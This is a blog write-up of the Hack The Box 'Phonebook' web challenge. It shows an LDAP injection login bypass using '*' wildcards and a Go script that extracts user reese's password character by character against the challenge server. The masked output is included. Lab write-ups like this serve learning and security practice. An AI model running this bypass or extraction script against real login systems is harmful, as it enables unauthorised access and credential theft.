---
layout: post
title: "[HTB] Phonebook writeup"
slug: "phonebook"
date: "2023-02-13"
comments: false
categories:
  - hacking
tags:
  - ctf
  - write up
  - hack the box
  - ldap
---

This is my writeup for Hackthebox [phonebook](https://app.hackthebox.com/challenges/phonebook) Web Challenge. Intially finding a way to exploit the website was quite hard, but once we find the vulnerability, the challenge is pretty straight forward and requires just basic bruteforcing. It also tests our scripting skill and all in all, the challenge is a satisfying one.

# Initial Analysis

Visiting the ip address we are greeted with a login page and some information about a workstation user called Reese.

![phonebook/login](/images/phonebook/phonebook1.png)

*img: phonebook/login*

Since I am greeted with a login page, I tried my luck with sqli for quite a while but it yielded no results. 
All my inputs were greeted with ```Authentication failed```. 

![phonebook/login](/images/phonebook/phonebook2.png)

*img: phonebook/login*

After going through the forums and looking for some hints, I got hints of using wildcards in the input. So I tried ```*``` in both the login fields.
> Just like that, I was in.

The challenge wasn't over and the authenticated page contained just a search page field. I did the same thing as before and tried inputting different combinations of characters and injections in the search field. Inputting alphanumeric characters yielded names, emails and phonenumbers of people but I still couldn't find the flag for the challenge. 

![phonebook/login](/images/phonebook/phonebook3.png)

*img: phonebook/search=reese*

Since the login page had greeted us with workstation user ```reese```, it must be a hint to the flag.
So I tried reese as the username and ```*``` for the password and I was able to log in. 

I got another hint that the challenge is based on [LDAP injection](https://www.synopsys.com/glossary/what-is-ldap-injection.html). So I shifted my focus on getting the password for the username reese since it was quite possibly the flag for the challenge.

So here is the code I wrote for bruteforcing the password using ```*``` characters at the end and trying different permutations of alphanumeric and symbols.

```go
package main

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
)

const (
	URL = "http://144.126.236.52:31199/login"
)

func checkLogin(formData url.Values) bool {
	response, err := http.PostForm(URL, formData)
	if err != nil {
		fmt.Println(err)
	}
	defer response.Body.Close()

	redir := response.Request.URL.String()

	return !strings.Contains(redir, "Authentication")

}

func main() {
	flag := ""
	str := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@_$%!&{}"
	counter := 0

	for {
		if counter == len(str) {
			fmt.Printf("%s", flag)
			break
		}
		password := fmt.Sprintf("%s%c*", flag, str[counter])
		formData := url.Values{
			"username": {"reese"},
			"password": {password},
		}

		if checkLogin(formData) {
			flag = fmt.Sprintf("%s%c", flag, str[counter])
			fmt.Println(flag)
			counter = 0
		} else {
			counter += 1
		}
	}
}
```

And here is output of the code. I had tried to run the bruteforcing concurrently but it had very little impact on the performance since, the machine did not accept many simultaneous request.

```bash
> go run main.go
H
HT
HTB{*
HTB{******
...
HTB{**********}
```

> That's it


